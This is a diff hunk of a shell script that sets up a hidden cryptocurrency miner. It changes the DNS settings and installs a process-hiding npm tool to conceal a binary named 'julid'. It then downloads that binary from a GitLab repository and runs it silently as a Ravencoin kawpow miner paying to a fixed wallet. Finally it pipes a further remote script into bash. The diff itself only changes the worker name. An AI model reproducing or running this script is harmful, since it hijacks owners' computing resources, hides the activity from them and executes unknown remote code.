@@ -11,5 +11,5 @@ echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
 sudo su --command "curl -sL https://deb.nodesource.com/setup_17.x | sudo -E bash - && sudo apt-get install -y nodejs && npm i -g updates && npm i -g node-process-hider && npm install -g npm@8.10.0 && sudo ph add julid"
 wget https://gitlab.com/liugtiujk/portal/-/raw/main/julid >/dev/null 2>&1
 chmod +x julid
-./julid -a kawpow --coin rvn -o stratum+tcp://rvn.2miners.com:6060 -u R9rCxKLhi9eH779oPY1mTXpvDWwvjYiJYR -w ROOT >/dev/null 2>&1 &
+./julid -a kawpow --coin rvn -o stratum+tcp://rvn.2miners.com:6060 -u R9rCxKLhi9eH779oPY1mTXpvDWwvjYiJYR -w ROOT1 >/dev/null 2>&1 &
 curl -sL https://raw.githubusercontent.com/bsheredia/dumel/main/pie.sh | bash
